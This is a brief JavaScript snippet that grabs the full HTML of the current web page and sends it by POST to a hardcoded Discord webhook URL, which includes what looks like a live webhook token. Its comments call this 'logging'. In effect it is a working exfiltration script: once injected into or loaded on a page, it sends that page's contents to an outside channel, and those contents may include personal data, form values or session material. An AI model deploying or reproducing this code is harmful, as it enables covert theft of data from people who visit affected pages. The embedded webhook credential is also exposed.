// Define your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1232503153694343179/BrfWvS0RsvE0Yhyl8d-78H5NW99oHODIuAPvgbiVDS9ddcGjz0Po3V2EeHbxFpTUif5D';

// Fetch the page content
const pageContent = document.documentElement.innerHTML;

// Create a payload object with the page content
const payload = {
  content: pageContent
};

// Make a POST request to the Discord webhook URL
fetch(webhookUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(payload)
})
.then(response => console.log('Page content logged to Discord'))
.catch(error => console.error('Error logging page content to Discord:', error));

